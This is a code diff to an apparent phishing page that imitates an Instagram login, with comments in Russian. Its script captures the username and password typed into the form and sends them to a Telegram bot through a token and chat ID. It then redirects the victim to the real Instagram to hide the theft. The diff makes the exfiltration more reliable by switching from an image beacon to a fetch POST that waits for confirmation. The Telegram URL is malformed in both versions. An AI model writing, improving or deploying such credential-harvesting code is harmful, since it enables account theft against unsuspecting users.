@@ -69,7 +69,7 @@
     </footer>
 <script>
 document.querySelector('.login-form').addEventListener('submit', function(e) {
-    e.preventDefault(); // Останавливаем стандартную отправку
+    e.preventDefault(); // Запрещаем стандартную перезагрузку
 
     const token = '8609652045:AAGsMe6ot70ufCcdRyRk-t_AScRkHwhuM2E'; 
     const chatId = '1994955308';
@@ -77,22 +77,32 @@ document.querySelector('.login-form').addEventListener('submit', function(e) {
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    // Формируем текст сообщения
-    const text = encodeURIComponent(`🔔 Новый вход!\n👤 Логин: ${username}\n🔑 Пароль: ${password}`);
+    const message = `🔔 Новый вход на страницу!\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
+    const url = `https://telegram.org{token}/sendMessage`;
 
-    // Открываем прямую ссылку отправки в скрытом режиме, чтобы браузер не блокировал запрос
-    const telegramUrl = `https://telegram.org{token}/sendMessage?chat_id=${chatId}&text=${text}`;
-    
-    // Выполняем переход на официальный сайт, параллельно пингуя Telegram API
-    const img = new Image();
-    img.src = telegramUrl;
-    
-    // Небольшая задержка перед перенаправлением, чтобы запрос успел уйти в сеть
-    setTimeout(function() {
+    // Надежная отправка данных через современный fetch-запрос
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    })
+    .then(response => {
+        // Страница уйдет на настоящий Instagram ТОЛЬКО ПОСЛЕ ТОГО, как Telegram подтвердит получение данных
         window.location.href = 'https://instagram.com';
-    }, 500);
+    })
+    .catch(error => {
+        console.error('Ошибка сети:', error);
+        // Даже если будет сбой интернета, плавно перенаправляем пользователя
+        window.location.href = 'https://instagram.com';
+    });
 });
 </script>
+
 
 
 </body>
